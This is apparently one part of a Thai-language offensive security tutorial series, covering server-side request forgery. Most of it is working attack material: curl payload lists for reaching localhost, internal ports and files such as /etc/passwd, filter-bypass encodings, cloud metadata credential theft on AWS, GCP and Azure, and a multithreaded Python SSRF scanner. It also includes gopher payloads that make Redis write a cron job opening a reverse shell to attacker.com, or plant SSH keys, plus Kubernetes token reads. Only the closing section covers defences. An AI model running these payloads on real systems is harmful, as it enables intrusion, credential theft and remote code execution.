# Part 32: SSRF - Server-Side Request Forgery

## สารบัญ
1. [ทำความเข้าใจ SSRF](#1-ทำความเข้าใจ-ssrf)
2. [Basic SSRF Exploitation](#2-basic-ssrf-exploitation)
3. [SSRF Bypass Techniques](#3-ssrf-bypass-techniques)
4. [Blind SSRF](#4-blind-ssrf)
5. [Cloud Metadata SSRF](#5-cloud-metadata-ssrf)
6. [SSRF ไปยัง Internal Services](#6-ssrf-ไปยัง-internal-services)
7. [เครื่องมือและ Automation](#7-เครื่องมือและ-automation)
8. [Protocol Smuggling](#8-protocol-smuggling)
9. [การป้องกัน SSRF](#9-การป้องกัน-ssrf)
10. [สรุป](#10-สรุป)

---

## 1. ทำความเข้าใจ SSRF

### SSRF คืออะไร?

SSRF (Server-Side Request Forgery) คือช่องโหว่ที่ทำให้ server ส่ง HTTP request ไปยัง URL ที่ผู้โจมตีกำหนด สามารถเข้าถึง internal network ที่ firewall ปิดกั้น

```
┌──────────────────────────────────────────────────────────────┐
│                       SSRF Attack Flow                        │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  Internet:  Attacker -> Web App (public)                     │
│                                                              │
│  Attacker sends: GET /fetch?url=http://169.254.169.254/       │
│                                                              │
│  Web App (server) fetches that URL internally:               │
│    Internal -> AWS Metadata (169.254.169.254)                 │
│    Internal -> Redis (127.0.0.1:6379)                         │
│    Internal -> Admin panel (192.168.1.1)                      │
│                                                              │
│  Response returned to Attacker!                              │
│                                                              │
└──────────────────────────────────────────────────────────────┘
```

### ตัวอย่างโค้ด Vulnerable

```python
# vulnerable_fetch.py
from flask import Flask, request
import requests

app = Flask(__name__)

@app.route('/fetch')
def fetch_url():
    url = request.args.get('url')  # user-controlled!
    r = requests.get(url)          # server fetches the URL
    return r.text                  # returns content to user

# ตัวอย่างอื่น
@app.route('/webhook')
def test_webhook():
    callback_url = request.json.get('callback_url')  # user-controlled
    requests.post(callback_url, json={'test': True})  # server POSTs
```

### ผลกระทบของ SSRF

| ผลกระทบ | รายละเอียด |
|---------|----------|
| Port Scanning | สแกน internal ports |
| Service Access | Redis, Elasticsearch, Kubernetes API |
| Cloud Metadata | AWS credentials, GCP tokens |
| Internal Admin | Bypass IP-based restrictions |
| File Read | file:// protocol |
| RCE | ผ่าน Redis SSRF |

---

## 2. Basic SSRF Exploitation

### หา SSRF Endpoints

```bash
# ============================================
# พารามิเตอร์ที่มักเป็น SSRF endpoints
# ============================================

# URL parameters
/fetch?url=
/proxy?target=
/redirect?to=
/image?src=
/load?path=
/preview?link=
/check?website=
/validate?callback=
/webhook?endpoint=
/import?remote=

# POST body
{"url": "..."}
{"callback_url": "..."}
{"import_url": "..."}
{"webhook": "..."}
```

### Basic SSRF Test - Localhost

```bash
# ============================================
# ทดสอบอ่านไฟล์ localhost
# ============================================

TARGET="http://target.com/fetch"

# Test localhost access
curl "${TARGET}?url=http://localhost/"
curl "${TARGET}?url=http://127.0.0.1/"
curl "${TARGET}?url=http://0.0.0.0/"
curl "${TARGET}?url=http://[::1]/"

# Test file:// protocol
curl "${TARGET}?url=file:///etc/passwd"
curl "${TARGET}?url=file:///etc/hostname"
curl "${TARGET}?url=file:///proc/self/environ"

# Test internal ports
curl "${TARGET}?url=http://127.0.0.1:22/"   # SSH
curl "${TARGET}?url=http://127.0.0.1:3306/" # MySQL
curl "${TARGET}?url=http://127.0.0.1:6379/" # Redis
curl "${TARGET}?url=http://127.0.0.1:9200/" # Elasticsearch
curl "${TARGET}?url=http://127.0.0.1:8080/" # Alternative HTTP
curl "${TARGET}?url=http://127.0.0.1:8500/" # Consul
curl "${TARGET}?url=http://127.0.0.1:2375/" # Docker API
curl "${TARGET}?url=http://127.0.0.1:10250/" # Kubernetes kubelet
```

### Internal Network Scanning

```bash
# ============================================
# สแกน internal hosts ด้วย SSRF
# ============================================

# สแกน /16 subnet
for i in {1..254}; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    --max-time 3 \
    "${TARGET}?url=http://192.168.1.${i}/" 2>/dev/null)
  if [ "$response" != "000" ]; then
    echo "ALIVE: 192.168.1.${i} -> ${response}"
  fi
done

# Port scan via SSRF (ช้ากว่าแต่ได้ผล)
for port in 22 80 443 3306 6379 8080 8443 9200; do
  response=$(curl -s -o /dev/null -w "%{http_code}" \
    --max-time 5 \
    "${TARGET}?url=http://192.168.1.100:${port}/" 2>/dev/null)
  echo "Port ${port}: ${response}"
done

# สึกค common internal paths
for path in / /admin /api /health /status /metrics /dashboard; do
  response=$(curl -s -m 5 "${TARGET}?url=http://192.168.1.100${path}")
  echo "${path}: ${response:0:100}"  # สั้น 100 chars
done
```

---

## 3. SSRF Bypass Techniques

### Bypass IP Filters

```bash
# ============================================
# ถ้า app block 127.0.0.1
# ============================================

# Alternative representations of 127.0.0.1
curl "${TARGET}?url=http://127.1/"
curl "${TARGET}?url=http://127.0.1/"
curl "${TARGET}?url=http://0177.0.0.1/"    # Octal
curl "${TARGET}?url=http://0x7f.0x0.0x0.0x1/"  # Hex
curl "${TARGET}?url=http://2130706433/"    # Decimal (127.0.0.1 in int)
curl "${TARGET}?url=http://[::ffff:127.0.0.1]/"  # IPv6 mapped
curl "${TARGET}?url=http://[::1]/"         # IPv6 loopback
curl "${TARGET}?url=http://0.0.0.0/"
curl "${TARGET}?url=http://localhost/"

# 169.254.169.254 alternatives (AWS metadata)
curl "${TARGET}?url=http://169.254.169.254/"
curl "${TARGET}?url=http://0xa9fea9fe/"    # hex
curl "${TARGET}?url=http://2852039166/"    # decimal
curl "${TARGET}?url=http://[::ffff:a9fe:a9fe]/"  # IPv6

# ============================================
# DNS rebinding bypass
# ============================================
# สร้าง domain ที่ resolve ไป 127.0.0.1
# Services: nip.io, xip.io, sslip.io
curl "${TARGET}?url=http://127.0.0.1.nip.io/"         # resolves to 127.0.0.1
curl "${TARGET}?url=http://192-168-1-100.nip.io/"      # resolves to 192.168.1.100
curl "${TARGET}?url=http://127.0.0.1.xip.io/"
```

### Bypass URL Scheme Filters

```bash
# ============================================
# Alternative schemes
# ============================================

# HTTPS instead of HTTP
curl "${TARGET}?url=https://127.0.0.1/"

# dict:// (send data to port)
curl "${TARGET}?url=dict://127.0.0.1:6379/info"

# gopher:// (ส่ง raw TCP data - สำคัญ!)
# Format: gopher://host:port/_<data>
curl "${TARGET}?url=gopher://127.0.0.1:6379/_INFO%0d%0a"

# ftp://
curl "${TARGET}?url=ftp://127.0.0.1:21/"

# ldap://
curl "${TARGET}?url=ldap://127.0.0.1:389/"

# ============================================
# URL encoding bypass
# ============================================
curl "${TARGET}?url=http%3A%2F%2F127.0.0.1%2F"  # URL encoded
curl "${TARGET}?url=http://127.0.0.1%2F"          # Partial encoding
```

### Open Redirect + SSRF

```bash
# ============================================
# ถ้ามี Open Redirect บนเซิร์ฟเดียวกัน
# ============================================

# ถ้า app check whitelist domain
# /redirect?to=https://trusted.com/...
# -> redirect to http://127.0.0.1/admin

# 1. หา Open Redirect endpoint
curl "${TARGET}?url=https://target.com/redirect?to=http://127.0.0.1/admin"

# 2. URL parameter in path
curl "${TARGET}?url=https://target.com/go?url=http://127.0.0.1/"

# ============================================
# DNS rebinding attack
# ============================================
# 1. Attacker controls attacker.com DNS
# 2. First request: attacker.com -> attacker's server (IP check passes)
# 3. DNS TTL expires quickly
# 4. Second request: attacker.com -> 127.0.0.1 (bypass!)

# Using rebind.it for testing:
curl "${TARGET}?url=http://make-127-0-0-1.rebind.it/"
```

---

## 4. Blind SSRF

### Detecting Blind SSRF

```bash
# ============================================
# ใช้ interactsh สำหรับ blind SSRF detection
# ============================================

# 1. รัน interactsh
interactsh-client -v
# [INF] URL: xxxxxxxxxx.oast.pro

INTERACT="xxxxxxxxxx.oast.pro"

# 2. ทดสอบ DNS lookup
curl -X POST http://target.com/api/webhook \
  -H "Content-Type: application/json" \
  -d "{\"callback_url\": \"http://${INTERACT}/test\"}"

# 3. ถ้ามี DNS/HTTP request โพสต์ที interactsh -> vulnerable!

# ============================================
# ใช้ Burp Collaborator (Burp Pro)
# ============================================
# 1. Burp -> Collaborator tab -> Copy to clipboard
# 2. ใส่ collaborator URL ใน payload
# 3. Poll for interactions
```

### Blind SSRF via Error Messages

```bash
# ============================================
# สังเกต error messages
# ============================================

# Error ต่างๆ บอก port state:
curl "${TARGET}?url=http://127.0.0.1:22/"  
# SSH error -> port open
curl "${TARGET}?url=http://127.0.0.1:9999/"
# Connection refused -> port closed
curl "${TARGET}?url=http://127.0.0.1:999/"  
# Timeout -> filtered

# Error messages ที่บอกว่า port open:
# "Connection refused" = port closed
# "SSH" / "OpenSSH" = SSH port open
# "MySQL" = MySQL port open
# "Timeout" = filtered/open but slow
# "200 OK" response = HTTP service running
```

---

## 5. Cloud Metadata SSRF

### AWS EC2 Instance Metadata

```bash
# ============================================
# AWS EC2 Instance Metadata Service (IMDS)
# http://169.254.169.254/
# ============================================

METADATA="http://169.254.169.254"

# Basic info
curl "${TARGET}?url=${METADATA}/latest/meta-data/"
# ami-id
# hostname
# instance-id
# local-ipv4
# public-ipv4
# iam/

# IAM credentials (CRITICAL!)
curl "${TARGET}?url=${METADATA}/latest/meta-data/iam/security-credentials/"
# my-ec2-role  <- role name

curl "${TARGET}?url=${METADATA}/latest/meta-data/iam/security-credentials/my-ec2-role"
# {
#   "Code": "Success",
#   "LastUpdated": "2024-01-01T00:00:00Z",
#   "Type": "AWS-HMAC",
#   "AccessKeyId": "ASIAIOSFODNN7EXAMPLE",
#   "SecretAccessKey": "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
#   "Token": "AQoDYXdzEJr...",
#   "Expiration": "2024-01-01T12:00:00Z"
# }

# User data (บางทีมี passwords)
curl "${TARGET}?url=${METADATA}/latest/user-data"

# Network info
curl "${TARGET}?url=${METADATA}/latest/meta-data/local-ipv4"
curl "${TARGET}?url=${METADATA}/latest/meta-data/public-ipv4"
curl "${TARGET}?url=${METADATA}/latest/meta-data/hostname"

# IMDSv2 (requires token)
# Token request
curl "${TARGET}?url=${METADATA}/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# ใช้ร่วมกัน: SSRF ไม่ส่ง PUT headers ได้ง่าย -> IMDSv2 ช่วยป้องกัน
```

### Google Cloud Platform Metadata

```bash
# ============================================
# GCP Instance Metadata
# http://metadata.google.internal/computeMetadata/v1/
# ต้องส่ง Header: Metadata-Flavor: Google
# ============================================

GCP_META="http://metadata.google.internal/computeMetadata/v1"

curl "${TARGET}?url=${GCP_META}/project/project-id&Metadata-Flavor=Google"
curl "${TARGET}?url=${GCP_META}/instance/service-accounts/default/token&Metadata-Flavor=Google"
# {"access_token": "ya29.xxx", "expires_in": 3599, "token_type": "Bearer"}

curl "${TARGET}?url=${GCP_META}/instance/service-accounts/default/scopes&Metadata-Flavor=Google"
curl "${TARGET}?url=${GCP_META}/instance/name&Metadata-Flavor=Google"
curl "${TARGET}?url=${GCP_META}/instance/zone&Metadata-Flavor=Google"
```

### Azure IMDS

```bash
# ============================================
# Azure Instance Metadata Service
# http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Header: Metadata: true
# ============================================

AZURE_META="http://169.254.169.254/metadata"

curl "${TARGET}?url=${AZURE_META}/instance?api-version=2021-02-01&Metadata=true"
# {"compute": {...}, "network": {...}}

# Identity token
curl "${TARGET}?url=${AZURE_META}/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/&Metadata=true"
# {"access_token": "...", "expires_in": "...", ...}
```

---

## 6. SSRF ไปยัง Internal Services

### Redis SSRF -> RCE

```bash
# ============================================
# Redis SSRF via Gopher protocol
# ============================================

# Redis protocol เป็น plain text -> gopher:// ส่งได้

# 1. ตรวจสอบ Redis
curl "${TARGET}?url=gopher://127.0.0.1:6379/_PING%0d%0a"
# +PONG

# 2. อ่านข้อมูล
curl "${TARGET}?url=gopher://127.0.0.1:6379/_INFO%0d%0a"
# redis_version:7.0.x
# ...

# 3. เขียน web shell ผ่าน Redis CRON
# gopher payload สำหรับ Redis cron RCE

REDIS_CMD="*1%0d%0a\$8%0d%0aflushall%0d%0a*3%0d%0a\$3%0d%0aset%0d%0a\$1%0d%0a1%0d%0a\$57%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$3%0d%0adir%0d%0a\$4%0d%0a/var%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$10%0d%0adbfilename%0d%0a\$4%0d%0acron%0d%0a*1%0d%0a\$4%0d%0asave%0d%0a"
curl "${TARGET}?url=gopher://127.0.0.1:6379/_${REDIS_CMD}"

# 4. Redis เขียน SSH authorized_keys
SSH_KEY="ssh-rsa AAAA...attacker"
REDIS_SSH="*1%0d%0a\$8%0d%0aflushall%0d%0a*3%0d%0a\$3%0d%0aset%0d%0a\$1%0d%0a1%0d%0a\$${#SSH_KEY}%0d%0a%0a%0a${SSH_KEY}%0a%0a%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$3%0d%0adir%0d%0a\$11%0d%0a/root/.ssh/%0d%0a*4%0d%0a\$6%0d%0aconfig%0d%0a\$3%0d%0aset%0d%0a\$10%0d%0adbfilename%0d%0a\$15%0d%0aauthorized_keys%0d%0a*1%0d%0a\$4%0d%0asave%0d%0a"
curl "${TARGET}?url=gopher://127.0.0.1:6379/_${REDIS_SSH}"
```

### Docker API SSRF

```bash
# ============================================
# Docker API (port 2375 - unauthenticated)
# ============================================

# List containers
curl "${TARGET}?url=http://127.0.0.1:2375/containers/json"
# [{"Id": "xxx", "Names": ["/web_app"], ...}]

# List images
curl "${TARGET}?url=http://127.0.0.1:2375/images/json"

# System info
curl "${TARGET}?url=http://127.0.0.1:2375/version"
curl "${TARGET}?url=http://127.0.0.1:2375/info"

# Create privileged container (RCE!)
# POST request via gopher
DOCKER_PAYLOAD='{"Image":"ubuntu","Cmd":["/bin/sh","-c","cat /etc/passwd > /tmp/pwned"],"HostConfig":{"Binds":["/:/host"],"Privileged":true}}'
# Needs POST via SSRF (harder)
```

### Kubernetes API SSRF

```bash
# ============================================
# Kubernetes API Server (port 6443/8080)
# ============================================

# ตรวจสอบ K8s API (unauthenticated)
curl "${TARGET}?url=http://127.0.0.1:8080/api/v1/namespaces/default/pods"
curl "${TARGET}?url=https://127.0.0.1:6443/api/v1/pods"

# Kubernetes service account tokens
curl "${TARGET}?url=file:///var/run/secrets/kubernetes.io/serviceaccount/token"
curl "${TARGET}?url=file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
curl "${TARGET}?url=file:///var/run/secrets/kubernetes.io/serviceaccount/namespace"

# ETCD (port 2379)
curl "${TARGET}?url=http://127.0.0.1:2379/v3/kv/range"

# kubelet API (port 10250 - container exec)
curl "${TARGET}?url=https://127.0.0.1:10250/pods"
```

---

## 7. เครื่องมือและ Automation

### SSRFmap

```bash
# ============================================
# SSRFmap - automated SSRF tool
# ============================================

git clone https://github.com/swisskyrepo/SSRFmap.git
cd SSRFmap
pip install -r requirements.txt

# Basic scan
python3 ssrfmap.py -r request.txt -p url

# request.txt:
# GET /fetch?url=FUZZ HTTP/1.1
# Host: target.com
# Cookie: session=abc123

# ระบุ module
python3 ssrfmap.py -r request.txt -p url -m readfiles
python3 ssrfmap.py -r request.txt -p url -m redis
python3 ssrfmap.py -r request.txt -p url -m portscan
python3 ssrfmap.py -r request.txt -p url -m aws_metadata

# Modules ที่มี:
# readfiles - อ่านไฟล์
# redis - Redis RCE
# portscan - สแกน ports
# aws_metadata - AWS credentials
# gopher - gopher protocol
```

### Python SSRF Scanner

```python
#!/usr/bin/env python3
# ssrf_scanner.py

import requests
import concurrent.futures
import ipaddress
import sys
from urllib.parse import urlencode
from colorama import Fore, Style, init

init()

class SSRFScanner:
    def __init__(self, target_url, param_name, headers=None):
        self.target_url = target_url
        self.param_name = param_name
        self.session = requests.Session()
        self.session.headers.update(headers or {})
        self.timeout = 10
    
    def test_ssrf(self, payload):
        """Test a single SSRF payload"""
        params = {self.param_name: payload}
        try:
            r = self.session.get(
                self.target_url,
                params=params,
                timeout=self.timeout,
                allow_redirects=False  # ดู redirect
            )
            return payload, r.status_code, len(r.text), r.text[:200]
        except requests.exceptions.ConnectionError:
            return payload, 'CONN_ERR', 0, ''
        except requests.exceptions.Timeout:
            return payload, 'TIMEOUT', 0, ''
        except Exception as e:
            return payload, 'ERROR', 0, str(e)
    
    def scan_localhost(self):
        """Test localhost access"""
        print(f"\n{Fore.CYAN}[*] Testing localhost access...{Style.RESET_ALL}")
        
        payloads = [
            'http://localhost/',
            'http://127.0.0.1/',
            'http://0.0.0.0/',
            'http://127.1/',
            'http://[::1]/',
            'http://127.0.0.1.nip.io/',
            'http://0177.0.0.1/',
            'http://0x7f.0x0.0x0.0x1/',
            'http://2130706433/',
            'file:///etc/passwd',
        ]
        
        for payload in payloads:
            _, status, length, body = self.test_ssrf(payload)
            if status not in ['CONN_ERR', 'ERROR', 403, 400]:
                indicator = Fore.RED + '[INTERESTING]' + Style.RESET_ALL
            else:
                indicator = Fore.GREEN + '[BLOCKED]' + Style.RESET_ALL
            print(f"  {indicator} {payload} -> {status} ({length} bytes)")
    
    def scan_ports(self, host, ports=None):
        """Scan ports on internal host"""
        if ports is None:
            ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017, 2375, 10250]
        
        print(f"\n{Fore.CYAN}[*] Scanning ports on {host}...{Style.RESET_ALL}")
        
        results = []
        for port in ports:
            payload = f'http://{host}:{port}/'
            _, status, length, body = self.test_ssrf(payload)
            
            if status == 'TIMEOUT':
                state = 'filtered'
            elif status == 'CONN_ERR':
                state = 'closed'
            elif status in [200, 302, 301, 401, 403]:
                state = 'OPEN'
                results.append(port)
                print(f"  {Fore.RED}OPEN:{Style.RESET_ALL} {host}:{port} -> {status}")
                if body:
                    print(f"    Banner: {body[:80]}")
            else:
                state = f'status:{status}'
            
            if state not in ['filtered', 'closed']:
                print(f"  Port {port}: {state}")
        
        return results
    
    def scan_aws_metadata(self):
        """Try to access AWS metadata"""
        print(f"\n{Fore.CYAN}[*] Testing AWS metadata access...{Style.RESET_ALL}")
        
        payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
        ]
        
        for payload in payloads:
            _, status, length, body = self.test_ssrf(payload)
            if status == 200 and length > 0:
                print(f"  {Fore.RED}[AWS METADATA ACCESSIBLE]{Style.RESET_ALL}")
                print(f"  URL: {payload}")
                print(f"  Response: {body}")
    
    def scan_internal_network(self, network='192.168.1.0/24', port=80):
        """Scan internal network range"""
        print(f"\n{Fore.CYAN}[*] Scanning {network}...{Style.RESET_ALL}")
        
        net = ipaddress.ip_network(network)
        live_hosts = []
        
        def check_host(ip):
            payload = f'http://{ip}:{port}/'
            _, status, length, body = self.test_ssrf(payload)
            if status not in ['CONN_ERR', 'ERROR', 'TIMEOUT']:
                return str(ip), status, body
            return None
        
        # Parallel scanning
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(check_host, ip): ip for ip in net.hosts()}
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    ip, status, body = result
                    live_hosts.append(ip)
                    print(f"  {Fore.RED}ALIVE:{Style.RESET_ALL} {ip}:{port} -> {status}")
        
        return live_hosts


if __name__ == '__main__':
    scanner = SSRFScanner(
        target_url='http://target.com/fetch',
        param_name='url'
    )
    scanner.scan_localhost()
    scanner.scan_ports('127.0.0.1')
    scanner.scan_aws_metadata()
```

---

## 8. Protocol Smuggling

### Gopher Protocol Basics

```bash
# ============================================
# Gopher protocol สำหรับส่ง raw TCP data
# Format: gopher://host:port/_{data}
# ============================================

# HTTP request via gopher
# GET / HTTP/1.0\r\n\r\n -> URL encoded:
HTTP_REQ="GET%20%2F%20HTTP%2F1.0%0d%0a%0d%0a"
curl "${TARGET}?url=gopher://127.0.0.1:80/_${HTTP_REQ}"

# ============================================
# FastCGI (PHP-FPM) via SSRF -> RCE
# Port 9000
# ============================================
# Generate gopher payload for FastCGI
pip install gopherus
gopherus --exploit fastcgi
# Input: /var/www/html/index.php
# Input: id (command to run)
# Output: gopher:// payload

# ============================================
# Memcached via SSRF
# Port 11211
# ============================================
curl "${TARGET}?url=gopher://127.0.0.1:11211/_stats%0d%0a"
curl "${TARGET}?url=gopher://127.0.0.1:11211/_get+key%0d%0a"
```

### gopherus Tool

```bash
# ============================================
# gopherus - generate gopher payloads
# ============================================

pip3 install gopherus
# หรือ
git clone https://github.com/tarunkant/Gopherus.git
cd Gopherus
pip3 install -r requirements.txt

# Redis exploit
python3 gopherus.py --exploit redis
# Give your victim redis IP  : 127.0.0.1
# Give your victim redis port : 6379
# What do you want?? :
# 1. /etc/cron.d/root
# 2. /root/.ssh/authorized_keys
# 3. var/www/html/backdoor.php

# MySQL exploit
python3 gopherus.py --exploit mysql
# Give Mysql Username : root
# Give Mysql Password :
# Give MySQL DB name : 
# Give MySQL Query : select ... into outfile ...

# FastCGI exploit
python3 gopherus.py --exploit fastcgi
# Give IP of server : 127.0.0.1
# Give port of FastCGI : 9000
# Give path to php file : /var/www/html/index.php
# What do you want? : id
```

---

## 9. การป้องกัน SSRF

### Secure Coding

```python
import re
import ipaddress
import socket
from urllib.parse import urlparse
import requests

def is_safe_url(url: str) -> bool:
    """ตรวจสอบว่า URL ปลอภัย"""
    try:
        parsed = urlparse(url)
        
        # Allowed schemes only
        if parsed.scheme not in ['http', 'https']:
            return False
        
        hostname = parsed.hostname
        if not hostname:
            return False
        
        # Resolve DNS
        try:
            ip = socket.gethostbyname(hostname)
        except socket.gaierror:
            return False
        
        # Block private/internal IPs
        ip_obj = ipaddress.ip_address(ip)
        if (ip_obj.is_private or 
            ip_obj.is_loopback or 
            ip_obj.is_link_local or
            ip_obj.is_multicast or
            ip_obj.is_unspecified):
            return False
        
        # Block cloud metadata IPs
        blocked_ips = ['169.254.169.254']
        if ip in blocked_ips:
            return False
        
        return True
    
    except Exception:
        return False


def safe_fetch(url: str) -> requests.Response:
    """Fetch URL safely"""
    if not is_safe_url(url):
        raise ValueError("Unsafe URL")
    
    # ใช้ timeout เสมอ
    return requests.get(
        url, 
        timeout=10,
        allow_redirects=False,  # ไม่ตาม redirect
        headers={'User-Agent': 'MyApp/1.0'}
    )
```

### Network-Level Protection

```bash
# ============================================
# iptables บล็อก outbound จาก web server
# ============================================

# อนุญาตเฉพาะ specific destinations
iptables -A OUTPUT -p tcp --dport 80 -d external.api.com -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -d external.api.com -j ACCEPT

# บล็อก internal network access
iptables -A OUTPUT -p tcp -d 10.0.0.0/8 -j DROP
iptables -A OUTPUT -p tcp -d 172.16.0.0/12 -j DROP
iptables -A OUTPUT -p tcp -d 192.168.0.0/16 -j DROP
iptables -A OUTPUT -p tcp -d 127.0.0.0/8 -j DROP
iptables -A OUTPUT -p tcp -d 169.254.0.0/16 -j DROP  # Cloud metadata

# บล็อก ทุกอย่างที่เหลือ
iptables -A OUTPUT -j DROP
```

---

## 10. สรุป

### Summary Table

| หัวข้อ | เนื้อหา |
|--------|--------|
| พื้นฐาน | Server เป็น proxy ส่ง request ตาม user input |
| Targets | localhost, internal network, cloud metadata |
| Bypass | Alternative IPs, DNS rebinding, Open redirect |
| Protocols | http, https, file, gopher, dict, ftp |
| Impact | Port scan, read files, cloud credentials, RCE |
| เครื่องมือ | SSRFmap, gopherus, Burp Collaborator |
| ป้องกัน | URL validation, IP allowlist, network firewall |

### Quick Reference - Payload List

```
# Localhost variants
http://localhost/
http://127.0.0.1/
http://127.1/
http://0.0.0.0/
http://[::1]/
http://0177.0.0.1/
http://2130706433/
file:///etc/passwd

# Cloud metadata
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/
http://169.254.169.254/metadata/instance

# Internal services
http://127.0.0.1:6379/  (Redis)
http://127.0.0.1:9200/  (Elasticsearch)
http://127.0.0.1:2375/  (Docker)
http://127.0.0.1:9000/  (FastCGI)
http://127.0.0.1:8500/  (Consul)

# Protocols
gopher://127.0.0.1:6379/_INFO%0d%0a
dict://127.0.0.1:6379/info
```

---

**ต่อไป**: [Part 33 - Metasploit Framework Exploitation](Part-33-Metasploit-Framework-Exploitation.md)
